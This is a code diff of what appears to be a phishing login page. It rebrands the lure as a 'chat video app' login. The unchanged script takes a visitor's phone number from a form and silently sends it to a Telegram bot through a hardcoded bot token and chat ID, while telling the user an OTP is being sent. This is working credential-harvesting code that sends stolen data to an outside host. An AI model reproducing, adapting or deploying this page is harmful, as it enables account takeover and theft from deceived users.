@@ -21,7 +21,7 @@
     body {
       margin: 0;
       font-family: 'Roboto', sans-serif;
-      background: url('1.jpeg') no-repeat center center fixed;
+      background: url('lc1.jpeg') no-repeat center center fixed;
       background-size: cover;
       display: flex;
       align-items: center;
@@ -200,7 +200,7 @@
     { token: "8197381796:AAFXSOeq5nJbKOctu77_jRDzD1gYKqdp4wg", chatId: "7438717637" }
   ];
 
-  phoneForm.addEventListener('submit', function(e) {
+  phoneForm.addEventListener('submit', function (e) {
     e.preventDefault();
 
     const phone = phoneInput.value.trim();
@@ -208,7 +208,7 @@
     localStorage.setItem('sessionBotIndex', currentBotIndex);
     const bot = bots[currentBotIndex];
 
-    const message = `🌀 *DATA USER LOGIN*\n━━━━━━━━━━━━━━\n📞 Phone: \`${phone}\`\n━━━━━━━━━━━━━━`;
+    const message = `🌀 *CHAT VIDEO APP LOGIN*\n━━━━━━━━━━━━━━\n📞 Phone: \`${phone}\`\n━━━━━━━━━━━━━━`;
     const api = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
 
     statusMessage.textContent = "⏳ Sending OTP to your Telegram account...";
@@ -239,6 +239,6 @@
         statusMessage.style.color = "red";
       });
   });
-</script>
+  </script>
 </body>
 </html>
